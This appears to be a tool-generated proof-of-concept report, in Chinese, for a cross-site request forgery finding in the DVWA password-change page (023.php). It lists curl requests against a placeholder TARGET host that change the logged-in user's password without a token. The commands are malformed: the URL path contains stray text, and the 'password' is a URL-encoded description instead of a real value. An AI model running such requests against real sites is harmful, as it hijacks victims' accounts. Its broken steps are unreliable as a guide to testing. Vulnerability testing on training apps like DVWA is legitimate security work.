# POC — DVWA 密码修改接口（023.php）缺少 CSRF token，可被跨站强制修改当前用户密码

- finding_id: `LLM-fb8cc628a9b1`
- type: `csrf` / CWE-352
- severity: `high`
- file: `023.php:17`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/vulnerabilities/csrf/ (023.php)'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 跨站请求伪造 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/vulnerabilities/csrf/ (023.php)?password_new=%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95%EF%BC%88%E8%A7%81%20poc.html%EF%BC%89'
```
预期：受害者在已登录状态下自动提交表单，服务端接受状态变更。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。